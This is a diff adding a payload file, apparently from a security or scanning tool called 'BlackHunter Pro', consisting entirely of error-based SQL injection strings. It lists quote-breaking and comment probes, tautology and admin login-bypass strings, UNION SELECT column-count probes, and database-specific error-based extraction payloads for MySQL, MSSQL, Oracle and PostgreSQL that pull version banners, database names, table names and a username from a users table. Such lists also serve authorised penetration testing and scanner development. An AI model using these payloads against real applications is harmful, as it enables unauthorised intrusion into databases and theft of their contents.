@@ -1,0 +1,86 @@
+# payloads/sqli/error_based.txt
+# Error-based SQL Injection Payloads
+# BlackHunter Pro
+
+'
+"
+')
+")
+';
+";
+`)
+`)
+'--
+"--
+'#
+"#
+'/* 
+"/* 
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+" OR 1=1--
+') OR ('1'='1
+') OR 1=1--
+')) OR (('1'='1
+')) OR 1=1--
+' AND 1=1--
+' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+1' AND 1=1--
+1' AND 1=2--
+1 AND 1=1--
+1 AND 1=2--
+1 OR 1=1--
+1 OR 1=2--
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' ORDER BY 100--
+1' GROUP BY 1--
+1' HAVING 1=1--
+1' HAVING 1=2--
+admin'--
+admin'#
+admin'/*
+' OR 'x'='x
+' OR 'x'='y
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL,NULL--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT 1,2,3--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT version()) AS int)--
+' AND 1=CAST((SELECT version()) AS numeric)--
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--
+' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(106)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual) IS NOT NULL--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int,DB_NAME())--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT user FROM dual))--
+' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(106)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)--
+' AND 1=(SELECT 1 FROM PG_SLEEP(0))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
